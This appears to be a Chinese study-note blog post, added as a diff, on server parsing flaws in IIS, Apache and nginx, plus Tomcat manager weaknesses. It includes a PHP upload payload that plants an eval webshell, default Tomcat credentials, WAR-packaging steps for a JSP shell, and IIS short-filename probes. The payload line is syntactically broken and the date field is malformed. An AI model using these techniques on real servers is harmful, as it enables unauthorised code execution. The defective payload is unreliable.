@@ -1,0 +1,83 @@
+---
+layout:     post
+title:      "解析漏洞及其他"
+subtitle:   ""
+date:       2017-07-231 15:00:00
+author:     "S0u1"
+header-img: "img/post-bg-2015.jpg"
+tags:
+    - 学习
+---
+#服务器解析漏洞  
+##IIS5.x-6.x解析漏洞  
+该解析漏洞只能解析asp文件。  
+
+###目录解析(6.0)  
+形式：www.xxx.com/xx.asp/xx.jpg  
+服务器会把.asp和.asa目录下的文件都解析成asp文件。  
+
+###文件解析  
+形式：www.xxx.com/xx.asp;.jpg  
+服务器默认不解析;后面的内容，因此xx.asp;.jpg被解析成asp文件。  
+
+###解析文件类型  
+IIS6.0默认的可执行文件还有：    
+/test.asa  
+/test.cer  
+/test.cdx  
+
+##apache解析漏洞  
+形式：www.xxx.com/test.php/php123  
+apache解析文件的规则是从右向左解析，如果后缀名为不可识别的文件，就继续往左识别。  
+##nginx解析漏洞  
+形式：www.xxx.com/UploadFiles/image/1.jpg/1.php  
+www.xxx.com/UploadFiles/image/1.jpg%00/php  
+www.xxx.com/UploadFiles/image/1.jpg/%20\0.php  
+
+Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。  
+
+当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHPCGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?  
+
+这就要说到fix_pathinfo这个选项了。   如果开启了这个选项，那么就会触发在PHP中的如下逻辑:
+PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了
+另一种利用：  
+上传一个名为test.jpg的文件，内容为：
+```php
+<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd]?>');?>
+```
+然后访问test.jpg/.php，就会在根目录下生成一句话木马shell.php  
+
+##IIS7.5解析漏洞
+与nginx类似
+#其他
+##Tomcat远程部署漏洞  
+tomcat为了方便管理与部署，安装完成后会默认有一个管理页面，管理员只需要远程上传一个war格式的文件，就可以将内容发布到网站。  
+tomcat的管理地址通常是：
+
+>http://localhost:8080/manager
+
+默认的账号密码是：
+
+>root/root  
+tomcat/tomcat  
+admin/admin  
+admin/123456  
+
+##tomcat爆破
+tomcat的认证比较弱，对用户名：密码做base64编码，请求响应如果不是401即表示登陆成功。登陆成功后，可直接上传war文件来getshell。  
+使用  
+
+>jar -cvf shell.war shell.jsp
+
+将.jsp的文件打包为war文件。
+
+##Apache默认页面泄露漏洞  
+Apache在安装后存在默认目录/icons/、/manual/  
+
+##IIS短文件名暴力猜解漏洞
+判断目标站点是否存在IIS短文件名暴力破解漏洞，可以分别访问以下两个URL：
+
+>http://localhost/\*~1\*\*\*\*/a.aspx  
+http://localhost/l1j1e\*~1\*\*\*\*/a.aspx
+
+如果访问第一个URL，返回404，而访问第二个URL，返回400，则说明目标站点存在漏洞。
